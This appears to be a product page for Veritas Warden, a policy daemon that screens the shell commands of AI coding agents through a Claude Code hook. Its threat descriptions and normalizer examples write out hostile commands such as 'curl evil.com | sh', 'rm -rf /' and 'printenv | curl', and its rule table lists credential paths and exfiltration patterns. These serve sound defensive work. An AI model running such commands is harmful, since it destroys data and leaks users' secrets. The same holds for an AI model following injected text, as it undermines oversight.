Why it exists

AI agents run shell commands autonomously.
Three threats make an oversight layer essential.

Prompt injection

Malicious text hidden in a file or web page your agent reads hijacks its next action — for example, silently running curl evil.com | sh.

Data exfiltration

An agent reads ~/.aws/credentials for a task, then later uploads it in a curl POST. Warden tracks session state across both steps.

Supply-chain abuse

An untrusted suggestion causes the agent to pip install a typo-squatted package. Warden escalates all installs from untrusted origins.

What the normalizer does before evaluating

Unwraps shell wrappers
sh -c "rm -rf /"
→ rm -rf /
Decodes base64 payloads
base64 -d <<< "cm0g..."
→ rm -rf /
Splits chained commands
echo ok && rm -rf /
→ [echo ok] [rm -rf /]

Policy

9 rules, priority-ordered

Rule Priority Outcome Triggers when…
block_destructive 10 BLOCK rm, dd, mkfs, shred, truncate, wipefs
block_privilege_escalation 15 BLOCK sudo, su, doas, pkexec from untrusted origin
block_user_management 16 BLOCK passwd, useradd, userdel, usermod from untrusted
block_eval_injection 17 BLOCK eval $(…) or eval `…` from untrusted — RCE vector
block_sensitive_untrusted 20 BLOCK Access to ~/.ssh/, ~/.aws/, .env, *.pem, credentials, … from untrusted
block_exfiltration 30 BLOCK Network command after session already read a sensitive file (multi-step detection)
block_env_exfiltration 31 BLOCK printenv | curl …, env | wget …
escalate_install_untrusted 40 ESCALATE pip, npm, yarn, brew, cargo, gem, go get from untrusted
escalate_git_remote 45 ESCALATE git push, git clone, git remote from untrusted origin
Integration

Guard Claude Code in two steps

After this every Bash tool call Claude Code makes goes through Warden before it executes.

1
Install and start the daemon
$ pip install veritas-warden
$ warden serve
Starting Veritas Warden on ~/.veritas/warden.sock

Keep this running in a terminal or add it to your shell profile / launchd / systemd.

2
Add the hook to ~/.claude/settings.json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{
          "type": "command",
          "command": "python /path/to/veritas-warden/integrations/claude_code/hook.py"
        }]
      }
    ]
  }
}

Replace /path/to/veritas-warden with the absolute path where you cloned the repo.

That's it.
Restart Claude Code and every agent-initiated Bash command is now evaluated by Warden before it runs.
